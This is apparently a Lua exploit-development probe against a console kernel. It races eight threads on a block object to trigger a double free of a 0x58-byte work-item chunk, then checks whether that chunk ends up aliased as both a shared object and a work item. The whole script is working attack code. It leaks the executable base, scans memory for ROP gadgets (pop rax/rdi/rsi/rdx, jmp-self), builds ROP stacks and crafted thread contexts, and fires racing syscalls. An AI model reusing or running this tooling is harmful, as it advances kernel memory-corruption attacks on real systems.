-- CRASH_CLASS: HIGH
-- PROBE 728a: does the path-B race duplicate the work-item chunk?
--
-- Context: 727a showed exactly two statuses of 0 per round with six 0x80020003,
-- but a 0 status proves nothing (the miss path at 8ad6fbae zeroes the slot
-- first). Path B has no [W+0x18] guard, so a follower that reaches the re-lookup
-- before the winner's clear at 8ad70003 frees the same 0x58 chunk twice.
--
-- A double free of W puts the same chunk in the free list twice. The next
-- non-block create takes 0x58 twice too -- S at 8b5c8b50 and then W in the loop
-- at 8ad72530 -- so the SAME chunk becomes both the shared object and the work
-- item. That is visible from userland: the object polls as something other
-- than 3, or its delete stops answering 0.
--
-- This probe races 8 children on one id of a block, then creates two objects
-- and polls them. Baseline pairs run first, with no race, to prove the detector
-- itself is quiet.

--
print("=== PROBE 728a: path-B race, work-item alias detector ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X poprax=%X poprdi=%X poprsi=%X poprdx=%X jmp$=%X",
    ebase, pop_rax, pop_rdi, pop_rsi, pop_rdx, jmp_g))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

local function spawn(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(stat))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local pout = mmap(page)


local COUNT = 8
local KIDS  = 8
local ROUNDS = 6

local function create1()
    local o = mmap(page)
    wd(o, 0)
    local ok, rv = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if not (ok and to_num(rv) == 0) then return nil end
    return rd(o) or 0
end
local function poll1(id)
    local ip, op = mmap(page), mmap(page)
    wd(ip, id); wd(op, 0x77777777)
    local ok = pcall(function() mk(664)(uint64(ip), uint64(1), uint64(op)) end)
    if not ok then return -1 end
    return rd(op) or 0
end
local function del1(id)
    local ip, sp = mmap(page), mmap(page)
    wd(ip, id); wd(sp, 0x77777777)
    local ok = pcall(function() mk(662)(uint64(ip), uint64(1), uint64(sp)) end)
    if not ok then return -1 end
    return rd(sp) or 0
end

print("[0] detector baseline, no race")
local basebad = 0
for t=1,4 do
    local a = create1()
    if not a then print("    baseline create failed") basebad = basebad + 1
    else
        local s1 = poll1(a)
        local b  = create1()
        local s2 = poll1(a)
        local sb = b and poll1(b) or -1
        local d1 = b and del1(a) or -1
        local d2 = b and del1(b) or -1
        print(string.format("    pair %d a=%08X s1=%X s2=%X b=%s sb=%X del=%X/%X",
            t, a, s1, s2, b and string.format("%08X",b) or "nil", sb, d1, d2))
        if s1 ~= 3 or s2 ~= 3 or sb ~= 3 or d1 ~= 0 or d2 ~= 0 then basebad = basebad + 1 end
    end
end
print(string.format("[0] baseline anomalies=%d/4", basebad))

local anomalies, rounds = 0, 0
for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(COUNT), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then
        print(string.format("    round %d block create failed rv=%s", r, tostring(to_num(rvc))))
    else
        local base = rd(o) or 0
        local ids, polls = mmap(page), mmap(page)
        for i=0,COUNT-1 do wd(ids + i*4, base + i*0x10000) end
        pcall(function() mk(664)(uint64(ids), uint64(COUNT), uint64(polls)) end)

        local idpage = mmap(page)
        wd(idpage, base)
        wd(W, 0)
        local stats, spawned = {}, 0
        for k=1,KIDS do
            stats[k] = mmap(page)
            wd(stats[k], 0x77777777)
            if spawn(idpage, stats[k]) then spawned = spawned + 1 end
        end
        sleep_ms(15)
        for i=1,KIDS*2 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
        sleep_ms(25)
        local zeros = 0
        for k=1,KIDS do if (rd(stats[k]) or 0) == 0 then zeros = zeros + 1 end end

        -- the detector: two objects, both alive at once, both must poll 3
        local a = create1()
        local sa1 = a and poll1(a) or -1
        local b = create1()
        local sa2 = a and poll1(a) or -1
        local sb  = b and poll1(b) or -1
        local da  = a and del1(a) or -1
        local db  = b and del1(b) or -1
        local bad = (sa1 ~= 3) or (sb ~= 3) or (da ~= 0) or (db ~= 0)  -- sa2 is the sticky 0x10003, not a signal
        if bad then anomalies = anomalies + 1 end
        rounds = rounds + 1
        print(string.format("[R] round %d spawned=%d zeros=%d a=%s sa1=%X sa2=%X b=%s sb=%X del=%X/%X%s",
            r, spawned, zeros,
            a and string.format("%08X",a) or "nil", sa1, sa2,
            b and string.format("%08X",b) or "nil", sb, da, db,
            bad and "   <-- ANOMALY" or ""))
    end
end

print(string.format("[E] rounds=%d anomalies=%d alive=%d", rounds, anomalies,
    to_num(native.fcall_with_rax(fn_ud, 20))))
